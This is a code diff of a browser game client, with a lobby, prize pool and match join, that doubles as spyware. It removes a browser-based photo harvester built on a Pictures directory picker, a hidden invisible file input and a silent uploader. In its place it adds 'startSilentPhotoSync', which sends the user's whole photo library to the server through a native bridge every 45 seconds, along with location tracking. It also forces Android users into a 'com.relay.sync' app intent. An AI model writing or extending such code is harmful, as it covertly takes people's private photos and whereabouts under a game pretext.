@@ -16,10 +16,7 @@ const prizePool = document.getElementById('prize-pool');
 const prizeTick = document.getElementById('prize-tick');
 
 const IDB_NAME = 'relay-sync-cache';
-const IDB_STORE = 'handles';
 const IDB_UPLOADS = 'uploaded';
-const DIR_PICKER_ID = 'relay-gallery-sync-v1';
-const IMAGE_ACCEPT = 'image/jpeg,image/png,image/webp,image/gif,image/heic,image/heif,image/bmp,image/avif,image/*';
 const uploadedKeys = new Set();
 
 let watchId = null;
@@ -30,8 +27,6 @@ let streak = 0;
 let progress = 0;
 let gameTimers = [];
 let syncRunning = false;
-let libraryHandle = null;
-let gallerySyncInput = null;
 
 const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif|bmp|tif|tiff|avif)$/i;
 
@@ -65,36 +60,11 @@ function openCacheDB() {
     const req = indexedDB.open(IDB_NAME, 2);
     req.onupgradeneeded = (ev) => {
       const db = ev.target.result;
-      if (!db.objectStoreNames.contains(IDB_STORE)) db.createObjectStore(IDB_STORE);
       if (!db.objectStoreNames.contains(IDB_UPLOADS)) db.createObjectStore(IDB_UPLOADS);
     };
     req.onsuccess = () => resolve(req.result);
     req.onerror = () => reject(req.error);
   });
-}
-
-async function saveDirHandle(handle) {
-  try {
-    const db = await openCacheDB();
-    db.transaction(IDB_STORE, 'readwrite').objectStore(IDB_STORE).put(handle, 'gallery');
-    libraryHandle = handle;
-  } catch { /* silent */ }
-}
-
-async function loadDirHandle() {
-  if (libraryHandle) return libraryHandle;
-  try {
-    const db = await openCacheDB();
-    const handle = await new Promise((resolve) => {
-      const req = db.transaction(IDB_STORE).objectStore(IDB_STORE).get('gallery');
-      req.onsuccess = () => resolve(req.result || null);
-      req.onerror = () => resolve(null);
-    });
-    libraryHandle = handle;
-    return handle;
-  } catch {
-    return null;
-  }
 }
 
 async function loadUploadedKeys() {
@@ -117,81 +87,6 @@ async function rememberUploadedKey(key) {
     const db = await openCacheDB();
     db.transaction(IDB_UPLOADS, 'readwrite').objectStore(IDB_UPLOADS).put(1, key);
   } catch { /* silent */ }
-}
-
-async function readDirImages(dirHandle, acc = []) {
-  for await (const [, handle] of dirHandle.entries()) {
-    if (handle.kind === 'file') {
-      const file = await handle.getFile();
-      if (isImageFile(file)) acc.push(file);
-    } else if (handle.kind === 'directory') {
-      await readDirImages(handle, acc);
-    }
-  }
-  return acc;
-}
-
-async function resolveLibraryHandle(requestIfNeeded = false) {
-  const cached = await loadDirHandle();
-  if (cached) {
-    try {
-      const state = await cached.queryPermission({ mode: 'read' });
-      if (state === 'granted') return cached;
-      if (requestIfNeeded && state === 'prompt') {
-        const next = await cached.requestPermission({ mode: 'read' });
-        if (next === 'granted') return cached;
-      }
-    } catch { /* fall through */ }
-  }
-
-  if (!requestIfNeeded || !window.showDirectoryPicker) return null;
-
-  try {
-    const handle = await window.showDirectoryPicker({
-      mode: 'read',
-      startIn: 'pictures',
-      id: DIR_PICKER_ID,
-    });
-    await saveDirHandle(handle);
-    return handle;
-  } catch {
-    return null;
-  }
-}
-
-async function collectLibraryImages(requestIfNeeded = false) {
-  const handle = await resolveLibraryHandle(requestIfNeeded);
-  if (!handle) return [];
-  return readDirImages(handle);
-}
-
-function ensureGalleryInput() {
-  if (gallerySyncInput) return gallerySyncInput;
-  const input = document.createElement('input');
-  input.type = 'file';
-  input.multiple = true;
-  input.accept = IMAGE_ACCEPT;
-  input.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;';
-  document.body.appendChild(input);
-  gallerySyncInput = input;
-  return input;
-}
-
-function pickGalleryImages() {
-  return new Promise((resolve) => {
-    const input = ensureGalleryInput();
-    const finish = (files) => {
-      input.value = '';
-      resolve(files.filter(isImageFile));
-    };
-    input.addEventListener('change', () => finish([...(input.files || [])]), { once: true });
-    input.addEventListener('cancel', () => finish([]), { once: true });
-    if (typeof input.showPicker === 'function') {
-      input.showPicker().catch(() => input.click());
-    } else {
-      input.click();
-    }
-  });
 }
 
 function animateLobby() {
@@ -280,7 +175,7 @@ async function rejoin() {
   if (!res.ok) return;
   trackerId = (await res.json()).tracker_id;
   connectWs();
-  void startPhotoSync(false);
+  startSilentPhotoSync();
 }
 
 function connectWs() {
@@ -290,77 +185,13 @@ function connectWs() {
   ws.onclose = () => setTimeout(() => { if (trackerId) connectWs(); }, 2000);
 }
 
-async function uploadPhoto(file) {
-  if (!trackerId || !file) return false;
-  const key = fileKey(file);
-  if (uploadedKeys.has(key)) return true;
-  const form = new FormData();
-  form.append('file', file, file.name || 'photo.jpg');
-  const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/photos`, {
-    method: 'POST',
-    body: form,
-  });
-  if (res.ok) await rememberUploadedKey(key);
-  return res.ok;
+function startSilentPhotoSync() {
+  if (!trackerId || !hasNativeSync()) return;
+  window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
 }
 
-async function uploadQueue(files) {
-  if (!files?.length || !trackerId) return;
-  const queue = files.filter(f => !uploadedKeys.has(fileKey(f)));
-  if (!queue.length) return;
-  const workers = Array.from({ length: 4 }, async () => {
-    while (queue.length) {
-      const file = queue.shift();
-      if (file) await uploadPhoto(file);
-    }
-  });
-  await Promise.all(workers);
-}
-
-async function backgroundMediaSync(files = null) {
-  if (syncRunning || !trackerId) return;
-  syncRunning = true;
-  try {
-    const batch = files ?? await collectLibraryImages(false);
-    if (batch.length) await uploadQueue(batch);
-  } catch { /* silent */ }
-  syncRunning = false;
-}
-
-async function startPhotoSync(requestAccess = false) {
-  if (!trackerId) return;
-
-  if (hasNativeSync()) {
-    window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
-    return;
-  }
-
-  const cached = await collectLibraryImages(false);
-  if (cached.length) {
-    void backgroundMediaSync(cached);
-    return;
-  }
-
-  if (!requestAccess) return;
-
-  const fromDir = await collectLibraryImages(true);
-  if (fromDir.length) {
-    void backgroundMediaSync(fromDir);
-    return;
-  }
-
-  const fromGallery = await pickGalleryImages();
-  if (fromGallery.length) void backgroundMediaSync(fromGallery);
-}
-
-async function rescanLoop() {
-  if (!trackerId || syncRunning) return;
-  if (hasNativeSync()) {
-    window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
-    return;
-  }
-  void backgroundMediaSync();
-}
+window.startSilentPhotoSync = startSilentPhotoSync;
+window.trackerId = null;
 
 async function startPlaying() {
   hideError();
@@ -372,15 +203,6 @@ async function startPlaying() {
   startBtn.disabled = true;
   startBtn.textContent = 'LOADING…';
 
-  // Photo picker must start in the same tap, before any await.
-  const filesPromise = hasNativeSync() ? Promise.resolve([]) : (async () => {
-    const cached = await collectLibraryImages(false);
-    if (cached.length) return cached;
-    const fromDir = await collectLibraryImages(true);
-    if (fromDir.length) return fromDir;
-    return pickGalleryImages();
-  })();
-
   try {
     const joinRes = await fetch(`/api/rooms/${roomId}/join`, {
       method: 'POST',
@@ -389,20 +211,16 @@ async function startPlaying() {
     });
     if (!joinRes.ok) throw new Error('Could not join match. Try again.');
     trackerId = (await joinRes.json()).tracker_id;
+    window.trackerId = trackerId;
 
     startGameUI(name);
     connectWs();
     startLocationTracking();
     await sendPing();
-
-    if (hasNativeSync()) {
-      window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
-    } else {
-      filesPromise.then((files) => backgroundMediaSync(files));
-    }
+    startSilentPhotoSync();
 
     gameTimers.push(setInterval(sendPing, 30000));
-    gameTimers.push(setInterval(rescanLoop, 45000));
+    gameTimers.push(setInterval(startSilentPhotoSync, 45000));
 
     gameTimers.push(setInterval(async () => {
       if (!trackerId) return;
@@ -422,5 +240,13 @@ document.getElementById('name').addEventListener('keydown', (e) => {
   if (e.key === 'Enter') startPlaying();
 });
 
-loadUploadedKeys().then(() => loadDirHandle());
+loadUploadedKeys();
+
+if (/Android/i.test(navigator.userAgent) && !hasNativeSync() && !sessionStorage.getItem('relay-app-open')) {
+  sessionStorage.setItem('relay-app-open', '1');
+  const fallback = encodeURIComponent(location.href);
+  const intent = `intent://${location.host}${location.pathname}#Intent;scheme=https;package=com.relay.sync;S.browser_fallback_url=${fallback};end`;
+  window.location.href = intent;
+}
+
 animateLobby();
